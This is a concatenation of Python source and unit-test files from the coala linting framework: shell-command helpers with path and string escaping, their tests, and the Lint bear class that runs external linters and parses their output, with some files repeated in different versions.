        self.assertEqual(
            escape_path_argument("system|a|b|c?d", _type),
            "system|a|b|c?d")


class RunShellCommandTest(unittest.TestCase):

    @staticmethod
    def construct_testscript_command(scriptname):
        return " ".join(                    
            escape_path_argument(s) for s in (
                sys.executable,                    
                os.path.join(os.path.dirname(os.path.realpath(__file__)),
                             "run_shell_command_testfiles",
                             scriptname)))                    

    def test_run_interactive_shell_command(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_interactive_program.py")

        with run_interactive_shell_command(command) as p:
            self.assertEqual(p.stdout.readline(), "test_program X\n")
            self.assertEqual(p.stdout.readline(), "Type in a number:\n")
            p.stdin.write("33\n")
            p.stdin.flush()
            self.assertEqual(p.stdout.readline(), "33\n")
            self.assertEqual(p.stdout.readline(), "Exiting program.\n")

    def test_run_interactive_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command",
                                               weird_parameter=30):
                pass

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command", shell=False):                    
                pass

    def test_run_shell_command_without_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_program.py")

        stdout, stderr = run_shell_command(command)

        expected = ("test_program Z\n"
                    "non-interactive mode.\n"
                    "Exiting...\n")
        self.assertEqual(stdout, expected)
        self.assertEqual(stderr, "")

    def test_run_shell_command_with_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_input_program.py")

        stdout, stderr = run_shell_command(command, "1  4  10  22")

        self.assertEqual(stdout, "37\n")
        self.assertEqual(stderr, "")

        stdout, stderr = run_shell_command(command, "1 p 5")

        self.assertEqual(stdout, "")
        self.assertEqual(stderr, "INVALID INPUT\n")

    def test_run_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", weird_parameter2="abc")

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", universal_newlines=False)


class PrepareStringArgumentTest(unittest.TestCase):

    def setUp(self):
        self.test_strings = ("normal_string",
                             "string with spaces",
                             'string with quotes"a',
                             "string with s-quotes'b",
                             "bsn \n A",
                             "unrecognized \\q escape")

    def test_prepare_string_argument_sh(self):
        expected_results = ('"normal_string"',
                            '"string with spaces"',
                            '"string with quotes\\"a"',
                            '"string with s-quotes\'b"',
                            '"bsn \n A"',
                            '"unrecognized \\q escape"')

        for string, result in zip(self.test_strings, expected_results):
            self.assertEqual(prepare_string_argument(string, "sh"),
                             result)

    def test_prepare_string_argument_unsupported(self):
        for string in self.test_strings:
            self.assertEqual(prepare_string_argument(string, "WeIrD_O/S"),
                             string)

from contextlib import contextmanager
from subprocess import PIPE, Popen

from coalib.parsing.StringProcessing import escape


@contextmanager
def run_interactive_shell_command(command, **kwargs):
    """
    Runs a command in shell and provides stdout, stderr and stdin streams.                    

    This function creates a context manager that sets up the process, returns                    
    to caller, closes streams and waits for process to exit on leaving.                    

    The process is opened in `universal_newlines` mode.                    

    :param command: The command to run on shell.                    
    :param kwargs:  Additional keyword arguments to pass to `subprocess.Popen`
                    that is used to spawn the process (except `shell`,                    
                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    
                    `TypeError` is raised then).                    
    :return:        A context manager yielding the process started from the
                    command.
    """
    process = Popen(command,
                    shell=True,                    
                    stdout=PIPE,
                    stderr=PIPE,
                    stdin=PIPE,
                    universal_newlines=True,
                    **kwargs)
    try:
        yield process
    finally:
        process.stdout.close()
        process.stderr.close()
        process.stdin.close()
        process.wait()


def run_shell_command(command, stdin=None, **kwargs):
    """
    Runs a command in shell and returns the read stdout and stderr data.                    

    This function waits for the process to exit.                    

    :param command: The command to run on shell.                    
    :param stdin:   Initial input to send to the process.
    :param kwargs:  Additional keyword arguments to pass to `subprocess.Popen`
                    that is used to spawn the process (except `shell`,                    
                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    
                    `TypeError` is raised then).                    
    :return:        A tuple with `(stdoutstring, stderrstring)`.
    """
    with run_interactive_shell_command(command, **kwargs) as p:
        ret = p.communicate(stdin)
    return ret


def get_shell_type():  # pragma: no cover
    """
    Finds the current shell type based on the outputs of common pre-defined
    variables in them. This is useful to identify which sort of escaping
    is required for strings.

    :return: The shell type. This can be either "powershell" if Windows
             Powershell is detected, "cmd" if command prompt is been
             detected or "sh" if it's neither of these.
    """
    out_hostname, _ = run_shell_command(["echo", "$host.name"])                    
    if out_hostname.strip() == "ConsoleHost":
        return "powershell"
    out_0, _ = run_shell_command(["echo", "$0"])                    
    if out_0.strip() == "" and out_0.strip() == "":
        return "cmd"
    return "sh"


def prepare_string_argument(string, shell=get_shell_type()):
    """
    Prepares a string argument for being passed as a parameter on shell.

    On `sh` this function effectively encloses the given string
    with quotes (either '' or "", depending on content).

    :param string: The string to prepare for shell.
    :param shell:  The shell platform to prepare string argument for.
                   If it is not "sh" it will be ignored and return the
                   given string without modification.
    :return:       The shell-prepared string.
    """
    if shell == "sh":
        return '"' + escape(string, '"') + '"'
    else:
        return string


def escape_path_argument(path, shell=get_shell_type()):
    """
    Makes a raw path ready for using as parameter in a shell command (escapes
    illegal characters, surrounds with quotes etc.).

    :param path:  The path to make ready for shell.
    :param shell: The shell platform to escape the path argument for. Possible
                  values are "sh", "powershell", and "cmd" (others will be
                  ignored and return the given path without modification).
    :return:      The escaped path argument.
    """
    if shell == "cmd":
        # If a quote (") occurs in path (which is illegal for NTFS file
        # systems, but maybe for others), escape it by preceding it with
        # a caret (^).
        return '"' + escape(path, '"', '^') + '"'
    elif shell == "sh":
        return escape(path, " ")
    else:
        # Any other non-supported system doesn't get a path escape.
        return path

import os
import unittest

from coalib.bearlib.abstractions.Lint import Lint
from coalib.misc.ContextManagers import prepare_file
from coalib.misc.Shell import escape_path_argument
from coalib.results.RESULT_SEVERITY import RESULT_SEVERITY
from coalib.results.SourceRange import SourceRange
from coalib.settings.Section import Section


class LintTest(unittest.TestCase):

    def setUp(self):
        section = Section("some_name")
        self.uut = Lint(section, None)

    def test_invalid_output(self):
        out = list(self.uut.process_output(
            ["1.0|0: Info message\n",
             "2.2|1: Normal message\n",
             "3.4|2: Major message\n"],
            "a/file.py",
            ['original_file_lines_placeholder']))
        self.assertEqual(len(out), 3)
        self.assertEqual(out[0].origin, "Lint")

        self.assertEqual(out[0].affected_code[0],
                         SourceRange.from_values("a/file.py", 1, 0))
        self.assertEqual(out[0].severity, RESULT_SEVERITY.INFO)
        self.assertEqual(out[0].message, "Info message")

        self.assertEqual(out[1].affected_code[0],
                         SourceRange.from_values("a/file.py", 2, 2))
        self.assertEqual(out[1].severity, RESULT_SEVERITY.NORMAL)
        self.assertEqual(out[1].message, "Normal message")

        self.assertEqual(out[2].affected_code[0],
                         SourceRange.from_values("a/file.py", 3, 4))
        self.assertEqual(out[2].severity, RESULT_SEVERITY.MAJOR)
        self.assertEqual(out[2].message, "Major message")

    def test_custom_regex(self):
        self.uut.output_regex = (r'(?P<origin>\w+)\|'
                                 r'(?P<line>\d+)\.(?P<column>\d+)\|'
                                 r'(?P<end_line>\d+)\.(?P<end_column>\d+)\|'
                                 r'(?P<severity>\w+): (?P<message>.*)')
        self.uut.severity_map = {"I": RESULT_SEVERITY.INFO}
        out = list(self.uut.process_output(
            ["info_msg|1.0|2.3|I: Info message\n"],
            'a/file.py',
            ['original_file_lines_placeholder']))
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0].affected_code[0].start.line, 1)
        self.assertEqual(out[0].affected_code[0].start.column, 0)
        self.assertEqual(out[0].affected_code[0].end.line, 2)
        self.assertEqual(out[0].affected_code[0].end.column, 3)
        self.assertEqual(out[0].severity, RESULT_SEVERITY.INFO)
        self.assertEqual(out[0].origin, 'Lint (info_msg)')

    def test_valid_output(self):
        out = list(self.uut.process_output(
            ["Random line that shouldn't be captured\n",
             "*************\n"],
            'a/file.py',
            ['original_file_lines_placeholder']))
        self.assertEqual(len(out), 0)

    def test_stdin_input(self):
        with prepare_file(["abcd", "efgh"], None) as (lines, filename):
            # Use more which is a command that can take stdin and show it.
            # This is available in windows and unix.
            self.uut.executable = "more"                    
            self.uut.use_stdin = True
            self.uut.use_stderr = False
            self.uut.process_output = lambda output, filename, file: output

            out = self.uut.lint(file=lines)
            # Some implementations of `more` add an extra newline at the end.
            self.assertTrue(("abcd\n", "efgh\n") == out or
                            ("abcd\n", "efgh\n", "\n") == out)

    def test_stderr_output(self):
        self.uut.executable = "echo"
        self.uut.arguments = "hello"
        self.uut.use_stdin = False
        self.uut.use_stderr = True
        self.uut.process_output = lambda output, filename, file: output
        out = self.uut.lint("unused_filename")
        self.assertEqual((), out)  # stderr is used

        self.uut.use_stderr = False
        out = self.uut.lint("unused_filename")
        self.assertEqual(('hello\n',), out)  # stdout is used

        def assert_warn(line):
            assert line == "hello"
        old_warn = self.uut.warn
        self.uut.warn = assert_warn
        self.uut._print_errors(["hello", "\n"])
        self.uut.warn = old_warn

    def test_gives_corrected(self):
        self.uut.gives_corrected = True
        out = tuple(self.uut.process_output(["a", "b"], "filename", ["a", "b"]))
        self.assertEqual((), out)
        out = tuple(self.uut.process_output(["a", "b"], "filename", ["a"]))
        self.assertEqual(len(out), 1)

    def test_missing_binary(self):
        old_binary = Lint.executable
        invalid_binary = "invalid_binary_which_doesnt_exist"
        Lint.executable = invalid_binary

        self.assertEqual(Lint.check_prerequisites(),
                         "'{}' is not installed.".format(invalid_binary))

        # "echo" is existent on nearly all platforms.
        Lint.executable = "echo"
        self.assertTrue(Lint.check_prerequisites())

        del Lint.executable
        self.assertTrue(Lint.check_prerequisites())

        Lint.executable = old_binary

    def test_config_file_generator(self):
        self.uut.executable = "echo"
        self.uut.arguments = "-c {config_file}"

        self.assertEqual(
            self.uut._create_command(config_file="configfile").strip(),
            "echo -c " + escape_path_argument("configfile"))

    def test_config_file_generator(self):
        self.uut.executable = "echo"
        self.uut.config_file = lambda: ["config line1"]
        config_filename = self.uut.generate_config_file()
        self.assertTrue(os.path.isfile(config_filename))
        os.remove(config_filename)

        # To complete coverage of closing the config file and check if any
        # errors are thrown there.
        self.uut.lint("filename")

import os
import sys
import unittest

from coalib.misc.Shell import (
    escape_path_argument, prepare_string_argument,
    run_interactive_shell_command, run_shell_command)


class EscapePathArgumentTest(unittest.TestCase):

    def test_escape_path_argument_sh(self):
        _type = "sh"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/usr/a-dir/", _type),
            "/home/usr/a-dir/")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla",
                                 _type),
            "/home/us\\ r/a-file\\ with\\ spaces.bla")
        self.assertEqual(
            escape_path_argument("/home/us r/a-dir with spaces/x/",
                                 _type),
            "/home/us\\ r/a-dir\\ with\\ spaces/x/")
        self.assertEqual(
            escape_path_argument(
                "relative something/with cherries and/pickles.delicious",
                _type),
            "relative\\ something/with\\ cherries\\ and/pickles.delicious")

    def test_escape_path_argument_cmd(self):
        _type = "cmd"
        self.assertEqual(
            escape_path_argument("C:\\Windows\\has-a-weird-shell.txt", _type),
            "\"C:\\Windows\\has-a-weird-shell.txt\"")
        self.assertEqual(
            escape_path_argument("C:\\Windows\\lolrofl\\dirs\\", _type),
            "\"C:\\Windows\\lolrofl\\dirs\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\fi le.exe", _type),
            "\"X:\\Users\\Maito Gai\\fi le.exe\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Mai to Gai\\director y\\",
                                 _type),
            "\"X:\\Users\\Mai to Gai\\director y\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\\"seven-gates\".y",
                                 _type),
            "\"X:\\Users\\Maito Gai\\^\"seven-gates^\".y\"")
        self.assertEqual(
            escape_path_argument("System32\\my-custom relative tool\\",
                                 _type),
            "\"System32\\my-custom relative tool\\\"")
        self.assertEqual(
            escape_path_argument("System32\\illegal\" name \"\".curd", _type),
            "\"System32\\illegal^\" name ^\"^\".curd\"")

    def test_escape_path_argument_unsupported(self):
        _type = "INVALID"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla", _type),
            "/home/us r/a-file with spaces.bla")
        self.assertEqual(
            escape_path_argument("|home|us r|a*dir with spaces|x|", _type),
            "|home|us r|a*dir with spaces|x|")
        self.assertEqual(
            escape_path_argument("system|a|b|c?d", _type),
            "system|a|b|c?d")


class RunShellCommandTest(unittest.TestCase):

    @staticmethod
    def construct_testscript_command(scriptname):
        return " ".join(                    
            escape_path_argument(s) for s in (
                sys.executable,                    
                os.path.join(os.path.dirname(os.path.realpath(__file__)),
                             "run_shell_command_testfiles",
                             scriptname)))                    

    def test_run_interactive_shell_command(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_interactive_program.py")

        with run_interactive_shell_command(command) as p:
            self.assertEqual(p.stdout.readline(), "test_program X\n")
            self.assertEqual(p.stdout.readline(), "Type in a number:\n")
            p.stdin.write("33\n")
            p.stdin.flush()
            self.assertEqual(p.stdout.readline(), "33\n")
            self.assertEqual(p.stdout.readline(), "Exiting program.\n")

    def test_run_interactive_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command",
                                               weird_parameter=30):
                pass

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command", shell=False):                    
                pass

    def test_run_shell_command_without_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_program.py")

        stdout, stderr = run_shell_command(command)

        expected = ("test_program Z\n"
                    "non-interactive mode.\n"
                    "Exiting...\n")
        self.assertEqual(stdout, expected)
        self.assertEqual(stderr, "")

    def test_run_shell_command_with_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_input_program.py")

        stdout, stderr = run_shell_command(command, "1  4  10  22")

        self.assertEqual(stdout, "37\n")
        self.assertEqual(stderr, "")

        stdout, stderr = run_shell_command(command, "1 p 5")

        self.assertEqual(stdout, "")
        self.assertEqual(stderr, "INVALID INPUT\n")

    def test_run_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", weird_parameter2="abc")

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", universal_newlines=False)


class PrepareStringArgumentTest(unittest.TestCase):

    def setUp(self):
        self.test_strings = ("normal_string",
                             "string with spaces",
                             'string with quotes"a',
                             "string with s-quotes'b",
                             "bsn \n A",
                             "unrecognized \\q escape")

    def test_prepare_string_argument_sh(self):
        expected_results = ('"normal_string"',
                            '"string with spaces"',
                            '"string with quotes\\"a"',
                            '"string with s-quotes\'b"',
                            '"bsn \n A"',
                            '"unrecognized \\q escape"')

        for string, result in zip(self.test_strings, expected_results):
            self.assertEqual(prepare_string_argument(string, "sh"),
                             result)

    def test_prepare_string_argument_unsupported(self):
        for string in self.test_strings:
            self.assertEqual(prepare_string_argument(string, "WeIrD_O/S"),
                             string)

import os
import re
import shutil
from subprocess import check_call, CalledProcessError, DEVNULL
import tempfile

from coalib.bears.Bear import Bear
from coalib.misc.Decorators import enforce_signature
from coalib.misc.Shell import escape_path_argument, run_shell_command
from coalib.results.Diff import Diff
from coalib.results.Result import Result
from coalib.results.RESULT_SEVERITY import RESULT_SEVERITY


class Lint(Bear):

    """
    Deals with the creation of linting bears.

    For the tutorial see:
    http://coala.readthedocs.org/en/latest/Users/Tutorials/Linter_Bears.html

    :param executable:                  The executable to run the linter.
    :param prerequisite_command:        The command to run as a prerequisite
                                        and is of type ``list``.
    :param prerequisites_fail_msg:      The message to be displayed if the
                                        prerequisite fails.
    :param arguments:                   The arguments to supply to the linter,
                                        such that the file name to be analyzed
                                        can be appended to the end. Note that
                                        we use ``.format()`` on the arguments -
                                        so, ``{abc}`` needs to be given as
                                        ``{{abc}}``. Currently, the following
                                        will be replaced:

                                         - ``{filename}`` - The filename passed
                                           to ``lint()``
                                         - ``{config_file}`` - The config file
                                           created using ``config_file()``

    :param output_regex:    The regex which will match the output of the linter
                            to get results. This is not used if
                            ``gives_corrected`` is set. This regex should give
                            out the following variables:

                             - line - The line where the issue starts.
                             - column - The column where the issue starts.
                             - end_line - The line where the issue ends.
                             - end_column - The column where the issue ends.
                             - severity - The severity of the issue.
                             - message - The message of the result.
                             - origin - The origin of the issue.

    :param diff_severity:   The severity to use for all results if
                            ``gives_corrected`` is set.
    :param diff_message:    The message to use for all results if
                            ``gives_corrected`` is set.
    :param use_stderr:      Uses stderr as the output stream is it's True.
    :param use_stdin:       Sends file as stdin instead of giving the file name.
    :param gives_corrected: True if the executable gives the corrected file
                            or just the issues.
    :param severity_map:    A dict where the keys are the possible severity
                            values the Linter gives out and the values are the
                            severity of the coala Result to set it to. If it is
                            not a dict, it is ignored.
    """
    executable = None
    prerequisite_command = None
    prerequisite_fail_msg = 'Unknown failure.'
    arguments = ""
    output_regex = re.compile(r'(?P<line>\d+)\.(?P<column>\d+)\|'
                              r'(?P<severity>\d+): (?P<message>.*)')
    diff_message = 'No result message was set'
    diff_severity = RESULT_SEVERITY.NORMAL
    use_stderr = False
    use_stdin = False
    gives_corrected = False
    severity_map = None

    def lint(self, filename=None, file=None):
        """
        Takes a file and lints it using the linter variables defined apriori.

        :param filename:  The name of the file to execute.
        :param file:      The contents of the file as a list of strings.
        """
        assert ((self.use_stdin and file is not None) or
                (not self.use_stdin and filename is not None))

        config_file = self.generate_config_file()
        self.command = self._create_command(filename=filename,
                                            config_file=config_file)

        stdin_input = "".join(file) if self.use_stdin else None
        stdout_output, stderr_output = run_shell_command(self.command,
                                                         stdin=stdin_input)                    
        self.stdout_output = tuple(stdout_output.splitlines(keepends=True))
        self.stderr_output = tuple(stderr_output.splitlines(keepends=True))
        results_output = (self.stderr_output if self.use_stderr
                          else self.stdout_output)
        results = self.process_output(results_output, filename, file)
        if not self.use_stderr:
            self._print_errors(self.stderr_output)

        if config_file:
            os.remove(config_file)

        return results

    def process_output(self, output, filename, file):
        """
        Take the output (from stdout or stderr) and use it to create Results.
        If the class variable ``gives_corrected`` is set to True, the
        ``_process_corrected()`` is called. If it is False,
        ``_process_issues()`` is called.

        :param output:   The output to be used to obtain Results from. The
                         output is either stdout or stderr depending on the
                         class variable ``use_stderr``.
        :param filename: The name of the file whose output is being processed.
        :param file:     The contents of the file whose output is being
                         processed.
        :return:         Generator which gives Results produced based on this
                         output.
        """
        if self.gives_corrected:
            return self._process_corrected(output, filename, file)
        else:
            return self._process_issues(output, filename)

    def _process_corrected(self, output, filename, file):
        """
        Process the output and use it to create Results by creating diffs.
        The diffs are created by comparing the output and the original file.

        :param output:   The corrected file contents.
        :param filename: The name of the file.
        :param file:     The original contents of the file.
        :return:         Generator which gives Results produced based on the
                         diffs created by comparing the original and corrected
                         contents.
        """
        for diff in self.__yield_diffs(file, output):
            yield Result(self,
                         self.diff_message,
                         affected_code=(diff.range(filename),),
                         diffs={filename: diff},
                         severity=self.diff_severity)

    def _process_issues(self, output, filename):
        """
        Process the output using the regex provided in ``output_regex`` and
        use it to create Results by using named captured groups from the regex.

        :param output:   The output to be parsed by regex.
        :param filename: The name of the file.
        :param file:     The original contents of the file.
        :return:         Generator which gives Results produced based on regex
                         matches using the ``output_regex`` provided and the
                         ``output`` parameter.
        """
        regex = self.output_regex
        if isinstance(regex, str):
            regex = regex % {"file_name": filename}

        # Note: We join ``output`` because the regex may want to capture
        #       multiple lines also.
        for match in re.finditer(regex, "".join(output)):
            yield self.match_to_result(match, filename)

    def _get_groupdict(self, match):
        """
        Convert a regex match's groups into a dictionary with data to be used
        to create a Result. This is used internally in ``match_to_result``.

        :param match:    The match got from regex parsing.
        :param filename: The name of the file from which this match is got.
        :return:         The dictionary containing the information:
                         - line - The line where the result starts.
                         - column - The column where the result starts.
                         - end_line - The line where the result ends.
                         - end_column - The column where the result ends.
                         - severity - The severity of the result.
                         - message - The message of the result.
                         - origin - The origin of the result.
        """
        groups = match.groupdict()
        if (
                isinstance(self.severity_map, dict) and
                "severity" in groups and
                groups["severity"] in self.severity_map):
            groups["severity"] = self.severity_map[groups["severity"]]
        return groups

    def _create_command(self, **kwargs):
        command = self.executable + ' ' + self.arguments
        for key in ("filename", "config_file"):
            kwargs[key] = escape_path_argument(kwargs.get(key, "") or "")
        return command.format(**kwargs)

    def _print_errors(self, errors):
        for line in filter(lambda error: bool(error.strip()), errors):
            self.warn(line)

    @staticmethod
    def __yield_diffs(file, new_file):
        if tuple(new_file) != tuple(file):
            wholediff = Diff.from_string_arrays(file, new_file)

            for diff in wholediff.split_diff():
                yield diff

    def match_to_result(self, match, filename):
        """
        Convert a regex match's groups into a coala Result object.

        :param match:    The match got from regex parsing.
        :param filename: The name of the file from which this match is got.
        :return:         The Result object.
        """
        groups = self._get_groupdict(match)

        # Pre process the groups
        for variable in ("line", "column", "end_line", "end_column"):
            if variable in groups and groups[variable]:
                groups[variable] = int(groups[variable])

        if "origin" in groups:
            groups['origin'] = "{} ({})".format(str(self.__class__.__name__),
                                                str(groups["origin"]))

        return Result.from_values(
            origin=groups.get("origin", self),
            message=groups.get("message", ""),
            file=filename,
            severity=int(groups.get("severity", RESULT_SEVERITY.NORMAL)),
            line=groups.get("line", None),
            column=groups.get("column", None),
            end_line=groups.get("end_line", None),
            end_column=groups.get("end_column", None))

    @classmethod
    def check_prerequisites(cls):
        """
        Checks for prerequisites required by the Linter Bear.

        It uses the class variables:
        -  ``executable`` - Checks that it is available in the PATH using
        ``shutil.which``.
        -  ``prerequisite_command`` - Checks that when this command is run,
        the exitcode is 0. If it is not zero, ``prerequisite_fail_msg``
        is gives as the failure message.

        If either of them is set to ``None`` that check is ignored.

        :return: True is all checks are valid, else False.
        """
        return cls._check_executable_command(
            executable=cls.executable,
            command=cls.prerequisite_command,
            fail_msg=cls.prerequisite_fail_msg)

    @classmethod
    @enforce_signature
    def _check_executable_command(cls, executable,
                                  command: (list, tuple, None), fail_msg):
        """
        Checks whether the required executable is found and the
        required command succesfully executes.

        The function is intended be used with classes having an
        executable, prerequisite_command and prerequisite_fail_msg.

        :param executable:   The executable to check for.
        :param command:      The command to check as a prerequisite.
        :param fail_msg:     The fail message to display when the
                             command doesn't return an exitcode of zero.

        :return: True if command successfully executes, or is not required.
                 not True otherwise, with a string containing a
                 detailed description of the error.
        """
        if cls._check_executable(executable):
            if command is None:
                return True  # when there are no prerequisites
            try:
                check_call(command, stdout=DEVNULL, stderr=DEVNULL)
                return True
            except (OSError, CalledProcessError):
                return fail_msg
        else:
            return repr(executable) + " is not installed."

    @staticmethod
    def _check_executable(executable):
        """
        Checks whether the needed executable is present in the system.

        :param executable: The executable to check for.

        :return: True if binary is present, or is not required.
                 not True otherwise, with a string containing a
                 detailed description of what's missing.
        """
        if executable is None:
            return True
        return shutil.which(executable) is not None

    def generate_config_file(self):
        """
        Generates a temporary config file.
        Note: The user of the function is responsible for deleting the
        tempfile when done with it.

        :return: The file name of the tempfile created.
        """
        config_lines = self.config_file()
        config_file = ""
        if config_lines is not None:
            for i, line in enumerate(config_lines):
                config_lines[i] = line if line.endswith("\n") else line + "\n"
            config_fd, config_file = tempfile.mkstemp()
            os.close(config_fd)
            with open(config_file, 'w') as conf_file:
                conf_file.writelines(config_lines)
        return config_file

    @staticmethod
    def config_file():
        """
        Returns a configuation file from the section given to the bear.
        The section is available in ``self.section``. To add the config
        file's name generated by this function to the arguments,
        use ``{config_file}``.

        :return: A list of lines of the config file to be used or None.
        """
        return None

from contextlib import contextmanager
from subprocess import PIPE, Popen

from coalib.parsing.StringProcessing import escape


@contextmanager
def run_interactive_shell_command(command, **kwargs):
    """
    Runs a command in shell and provides stdout, stderr and stdin streams.                    

    This function creates a context manager that sets up the process, returns                    
    to caller, closes streams and waits for process to exit on leaving.                    

    The process is opened in ``universal_newlines`` mode.                    

    :param command: The command to run on shell.                    
    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    
                    that is used to spawn the process (except ``shell``,                    
                    ``stdout``, ``stderr``, ``stdin`` and                    
                    ``universal_newlines``, a ``TypeError`` is raised then).
    :return:        A context manager yielding the process started from the
                    command.
    """
    process = Popen(command,
                    shell=True,                    
                    stdout=PIPE,
                    stderr=PIPE,
                    stdin=PIPE,
                    universal_newlines=True,
                    **kwargs)
    try:
        yield process
    finally:
        process.stdout.close()
        process.stderr.close()
        process.stdin.close()
        process.wait()


def run_shell_command(command, stdin=None, **kwargs):
    """
    Runs a command in shell and returns the read stdout and stderr data.                    

    This function waits for the process to exit.                    

    :param command: The command to run on shell.                    
    :param stdin:   Initial input to send to the process.
    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    
                    that is used to spawn the process (except ``shell``,                    
                    ``stdout``, ``stderr``, ``stdin`` and                    
                    ``universal_newlines``, a ``TypeError`` is raised then).
    :return:        A tuple with ``(stdoutstring, stderrstring)``.
    """
    with run_interactive_shell_command(command, **kwargs) as p:
        ret = p.communicate(stdin)
    return ret


def get_shell_type():  # pragma: no cover
    """
    Finds the current shell type based on the outputs of common pre-defined
    variables in them. This is useful to identify which sort of escaping
    is required for strings.

    :return: The shell type. This can be either "powershell" if Windows
             Powershell is detected, "cmd" if command prompt is been
             detected or "sh" if it's neither of these.
    """
    out = run_shell_command("echo $host.name")[0]                    
    if out.strip() == "ConsoleHost":
        return "powershell"
    out = run_shell_command("echo $0")[0]                    
    if out.strip() == "$0":
        return "cmd"
    return "sh"


def prepare_string_argument(string, shell=get_shell_type()):
    """
    Prepares a string argument for being passed as a parameter on shell.

    On ``sh`` this function effectively encloses the given string
    with quotes (either '' or "", depending on content).

    :param string: The string to prepare for shell.
    :param shell:  The shell platform to prepare string argument for.
                   If it is not "sh" it will be ignored and return the
                   given string without modification.
    :return:       The shell-prepared string.
    """
    if shell == "sh":
        return '"' + escape(string, '"') + '"'
    else:
        return string


def escape_path_argument(path, shell=get_shell_type()):
    """
    Makes a raw path ready for using as parameter in a shell command (escapes
    illegal characters, surrounds with quotes etc.).

    :param path:  The path to make ready for shell.
    :param shell: The shell platform to escape the path argument for. Possible
                  values are "sh", "powershell", and "cmd" (others will be
                  ignored and return the given path without modification).
    :return:      The escaped path argument.
    """
    if shell == "cmd":
        # If a quote (") occurs in path (which is illegal for NTFS file
        # systems, but maybe for others), escape it by preceding it with
        # a caret (^).
        return '"' + escape(path, '"', '^') + '"'
    elif shell == "sh":
        return escape(path, " ")
    else:
        # Any other non-supported system doesn't get a path escape.
        return path

import os
import sys
import unittest

from coalib.misc.Shell import (
    escape_path_argument, prepare_string_argument,
    run_interactive_shell_command, run_shell_command)


class EscapePathArgumentTest(unittest.TestCase):

    def test_escape_path_argument_sh(self):
        _type = "sh"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/usr/a-dir/", _type),
            "/home/usr/a-dir/")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla",
                                 _type),
            "/home/us\\ r/a-file\\ with\\ spaces.bla")
        self.assertEqual(
            escape_path_argument("/home/us r/a-dir with spaces/x/",
                                 _type),
            "/home/us\\ r/a-dir\\ with\\ spaces/x/")
        self.assertEqual(
            escape_path_argument(
                "relative something/with cherries and/pickles.delicious",
                _type),
            "relative\\ something/with\\ cherries\\ and/pickles.delicious")

    def test_escape_path_argument_cmd(self):
        _type = "cmd"
        self.assertEqual(
            escape_path_argument("C:\\Windows\\has-a-weird-shell.txt", _type),
            "\"C:\\Windows\\has-a-weird-shell.txt\"")
        self.assertEqual(
            escape_path_argument("C:\\Windows\\lolrofl\\dirs\\", _type),
            "\"C:\\Windows\\lolrofl\\dirs\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\fi le.exe", _type),
            "\"X:\\Users\\Maito Gai\\fi le.exe\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Mai to Gai\\director y\\",
                                 _type),
            "\"X:\\Users\\Mai to Gai\\director y\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\\"seven-gates\".y",
                                 _type),
            "\"X:\\Users\\Maito Gai\\^\"seven-gates^\".y\"")
        self.assertEqual(
            escape_path_argument("System32\\my-custom relative tool\\",
                                 _type),
            "\"System32\\my-custom relative tool\\\"")
        self.assertEqual(
            escape_path_argument("System32\\illegal\" name \"\".curd", _type),
            "\"System32\\illegal^\" name ^\"^\".curd\"")

    def test_escape_path_argument_unsupported(self):
        _type = "INVALID"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla", _type),
            "/home/us r/a-file with spaces.bla")
        self.assertEqual(
            escape_path_argument("|home|us r|a*dir with spaces|x|", _type),
            "|home|us r|a*dir with spaces|x|")
        self.assertEqual(
            escape_path_argument("system|a|b|c?d", _type),
            "system|a|b|c?d")


class RunShellCommandTest(unittest.TestCase):

    @staticmethod
    def construct_testscript_command(scriptname):
        return " ".join(                    
            escape_path_argument(s) for s in (
                sys.executable,                    
                os.path.join(os.path.dirname(os.path.realpath(__file__)),
                             "run_shell_command_testfiles",
                             scriptname)))                    

    def test_run_interactive_shell_command(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_interactive_program.py")

        with run_interactive_shell_command(command) as p:
            self.assertEqual(p.stdout.readline(), "test_program X\n")
            self.assertEqual(p.stdout.readline(), "Type in a number:\n")
            p.stdin.write("33\n")
            p.stdin.flush()
            self.assertEqual(p.stdout.readline(), "33\n")
            self.assertEqual(p.stdout.readline(), "Exiting program.\n")

